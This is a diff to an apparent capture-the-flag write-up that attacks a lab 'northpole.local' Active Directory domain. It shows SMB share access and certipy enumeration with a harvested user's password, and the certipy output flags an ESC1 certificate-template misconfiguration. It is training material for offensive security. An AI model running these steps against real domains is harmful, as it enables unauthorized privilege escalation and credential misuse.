@@ -200,7 +200,7 @@ krbtgt                                                2023-12-25 01:11:07.280803
 elfy                                                  2023-12-25 01:13:30.792119  2023-12-25 19:01:53.713983 
 wombleycube                                           2023-12-25 01:13:30.901503  2023-12-25 20:43:19.132455 
 ```
-### SMB Enumeration
+#### SMB Enumeration
 ```
 alabaster@ssh-server-vm:~/impacket$ smbclient.py  northpole.local/elfy:J4\`ufC49/J4766@10.0.0.53
 Impacket v0.11.0 - Copyright 2023 Fortra
@@ -228,6 +228,87 @@ drw-rw-rw-          0  Mon Dec 25 01:14:25 2023 super_secret_research
 [*] Downloading Cookies_Recipe.pdf
 [*] Downloading SignatureCookies.pdf
 [*] Downloading todo.txt
+```
 
+#### Exploiting Misconfigured AD Certificate Template-ESC1
+
+```bash
+certipy find -vulnerable -dc-ip 10.0.0.53 -u elfy@northpole.local -p 'J4`ufC49/J4766'
+```
+```txt
+[*] Finding certificate templates
+[*] Found 34 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 12 enabled certificate templates
+[*] Trying to get CA configuration for 'northpole-npdc01-CA' via CSRA
+[!] Got error while trying to get CA configuration for 'northpole-npdc01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
+[*] Trying to get CA configuration for 'northpole-npdc01-CA' via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Got CA configuration for 'northpole-npdc01-CA'
+[*] Saved BloodHound data to '20231225221757_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
+[*] Saved text output to '20231225221757_Certipy.txt'
+[*] Saved JSON output to '20231225221757_Certipy.json'
+alabaster@ssh-server-vm:~/impacket$ cat 20231225221757_Certipy.txt 
+Certificate Authorities
+  0
+    CA Name                             : northpole-npdc01-CA
+    DNS Name                            : npdc01.northpole.local
+    Certificate Subject                 : CN=northpole-npdc01-CA, DC=northpole, DC=local
+    Certificate Serial Number           : 25456FB64FCC00B54105D411B9CE0630
+    Certificate Validity Start          : 2023-12-25 01:06:19+00:00
+    Certificate Validity End            : 2028-12-25 01:16:18+00:00
+    Web Enrollment                      : Disabled
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Permissions
+      Owner                             : NORTHPOLE.LOCAL\Administrators
+      Access Rights
+        ManageCertificates              : NORTHPOLE.LOCAL\Administrators
+                                          NORTHPOLE.LOCAL\Domain Admins
+                                          NORTHPOLE.LOCAL\Enterprise Admins
+        ManageCa                        : NORTHPOLE.LOCAL\Administrators
+                                          NORTHPOLE.LOCAL\Domain Admins
+                                          NORTHPOLE.LOCAL\Enterprise Admins
+        Enroll                          : NORTHPOLE.LOCAL\Authenticated Users
+Certificate Templates
+  0
+    Template Name                       : NorthPoleUsers
+    Display Name                        : NorthPoleUsers
+    Certificate Authorities             : northpole-npdc01-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Enrollment Flag                     : PublishToDs
+                                          IncludeSymmetricAlgorithms
+    Private Key Flag                    : ExportableKey
+    Extended Key Usage                  : Encrypting File System
+                                          Secure Email
+                                          Client Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Validity Period                     : 1 year
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : NORTHPOLE.LOCAL\Domain Admins
+                                          NORTHPOLE.LOCAL\Domain Users
+                                          NORTHPOLE.LOCAL\Enterprise Admins
+      Object Control Permissions
+        Owner                           : NORTHPOLE.LOCAL\Enterprise Admins
+        Write Owner Principals          : NORTHPOLE.LOCAL\Domain Admins
+                                          NORTHPOLE.LOCAL\Enterprise Admins
+        Write Dacl Principals           : NORTHPOLE.LOCAL\Domain Admins
+                                          NORTHPOLE.LOCAL\Enterprise Admins
+        Write Property Principals       : NORTHPOLE.LOCAL\Domain Admins
+                                          NORTHPOLE.LOCAL\Enterprise Admins
+    [!] Vulnerabilities
+      ESC1                              : 'NORTHPOLE.LOCAL\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication
 
 ```
